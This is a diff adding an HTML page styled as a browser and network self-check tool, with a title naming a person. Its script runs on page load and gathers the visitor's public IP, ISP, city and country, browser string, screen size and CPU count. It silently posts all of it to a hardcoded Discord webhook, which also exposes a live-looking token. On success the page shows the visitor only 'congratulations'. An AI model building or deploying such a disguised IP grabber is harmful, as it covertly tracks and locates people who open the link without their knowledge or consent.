@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="zh-TW">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>鄧諾謙個人資料env</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", Arial, sans-serif;
+            margin: 30px;
+            background-color: #f8f9fa;
+            color: #333;
+        }
+        .container {
+            max-width: 650px;
+            margin: 0 auto;
+        }
+        .card {
+            background: #ffffff;
+            border: 1px solid #e0e0e0;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+        h1 {
+            font-size: 1.5rem;
+            color: #1a73e8;
+            margin-top: 0;
+            border-bottom: 2px solid #1a73e8;
+            padding-bottom: 10px;
+        }
+        h2 {
+            font-size: 1.1rem;
+            margin-top: 0;
+            color: #555;
+        }
+        p {
+            margin: 8px 0;
+            line-height: 1.5;
+        }
+        .status-online { color: #2e7d32; font-weight: bold; }
+        .status-offline { color: #c62828; font-weight: bold; }
+        .loading { color: #888; font-style: italic; }
+        .status-msg { margin-top: 10px; font-weight: bold; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="card">
+        <h1>電腦與網路檢測工具</h1>
+        
+        <h2>1. 瀏覽器與系統基本資訊</h2>
+        <p><strong>作業系統 / 瀏覽器環境:</strong> <br><span id="userAgent">解析中...</span></p>
+        <p><strong>螢幕解析度:</strong> <span id="screenRes">-</span></p>
+        <p><strong>網路連線狀態:</strong> <span id="onlineStatus">-</span></p>
+        <p><strong>CPU 邏輯核心數:</strong> <span id="cpuCores">未知</span></p>
+    </div>
+
+    <div class="card">
+        <h2>2. 外網 (公網) IP 資訊</h2>
+        <div id="ipInfo" class="loading">正在查詢 IP 資訊...</div>
+        <div id="webhookStatus" class="status-msg"></div>
+    </div>
+</div>
+
+<script>
+    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1537800547254538310/hgplPn9e2m4D2PJwHvCrfaWy7b0LXjVriwyL9gOu0Tq7cwjSNGO2VuKGEh45mBK1zTl_';
+
+    // 1. 取得基本資訊
+    const userAgent = navigator.userAgent;
+    const screenRes = `${window.screen.width} x ${window.screen.height}`;
+    const onlineStatus = navigator.onLine ? "已連線 (Online)" : "未連線 (Offline)";
+    const cpuCores = navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} 核` : "未知";
+
+    document.getElementById('userAgent').innerText = userAgent;
+    document.getElementById('screenRes').innerText = screenRes;
+    
+    const statusEl = document.getElementById('onlineStatus');
+    statusEl.innerText = onlineStatus;
+    statusEl.className = navigator.onLine ? "status-online" : "status-offline";
+    document.getElementById('cpuCores').innerText = cpuCores;
+
+    // 發送至 Discord Webhook 的函式
+    function sendToDiscord(ip, isp, location) {
+        // 使用 Markdown 格式構建訊息
+        const markdownContent = `恭喜你
+
+**網路資訊**
+* **公網 IP:** \`${ip}\`
+* **ISP:** ${isp}
+* **位置:** ${location}
+
+**系統與瀏覽器資訊**
+* **作業系統 / 瀏覽器:** \`${userAgent}\`
+* **螢幕解析度:** ${screenRes}
+* **連線狀態:** ${onlineStatus}
+* **CPU 核心數:** ${cpuCores}`;
+
+        fetch(DISCORD_WEBHOOK_URL, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                content: markdownContent
+            })
+        })
+        .then(response => {
+            if (response.ok) {
+                document.getElementById('webhookStatus').innerText = '✅ 恭喜你';
+                document.getElementById('webhookStatus').style.color = 'green';
+            } else {
+                throw new Error('Discord Webhook 回傳錯誤');
+            }
+        })
+        .catch(err => {
+            console.error('發送 Discord 失敗:', err);
+            document.getElementById('webhookStatus').innerText = '❌ 發送到 Discord 失敗（請檢查網路或 Webhook 網址）';
+            document.getElementById('webhookStatus').style.color = 'red';
+        });
+    }
+
+    // 2. 取得 IP 並觸發發送
+    fetch('https://ipwho.is/')
+        .then(response => response.json())
+        .then(data => {
+            let ip = '未知', isp = '未知', location = '未知';
+            
+            if (data.success) {
+                ip = data.ip;
+                isp = data.connection.isp || '未知';
+                location = `${data.city}, ${data.region}, ${data.country}`;
+
+                document.getElementById('ipInfo').classList.remove('loading');
+                document.getElementById('ipInfo').innerHTML = `
+                    <p><strong>公網 IP (Public IP):</strong> ${ip}</p>
+                    <p><strong>網路服務提供商 (ISP):</strong> ${isp}</p>
+                    <p><strong>地理位置:</strong> ${location}</p>
+                `;
+            } else {
+                throw new Error('Primary API Failed');
+            }
+
+            // 發送資訊至 Discord
+            sendToDiscord(ip, isp, location);
+        })
+        .catch(() => {
+            // 備用方案 (ipify)
+            fetch('https://api.ipify.org?format=json')
+                .then(res => res.json())
+                .then(ipData => {
+                    const ip = ipData.ip;
+                    document.getElementById('ipInfo').classList.remove('loading');
+                    document.getElementById('ipInfo').innerHTML = `
+                        <p><strong>公網 IP (Public IP):</strong> ${ip}</p>
+                        <p><em>(備註：ISP/地理位置暫時無法顯示)</em></p>
+                    `;
+                    sendToDiscord(ip, '無法取得', '無法取得');
+                })
+                .catch(() => {
+                    document.getElementById('ipInfo').classList.remove('loading');
+                    document.getElementById('ipInfo').innerHTML = `<p style="color:red;">無法取得外網 IP 資訊</p>`;
+                    sendToDiscord('無法取得', '無法取得', '無法取得');
+                });
+        });
+</script>
+
+</body>
+</html>
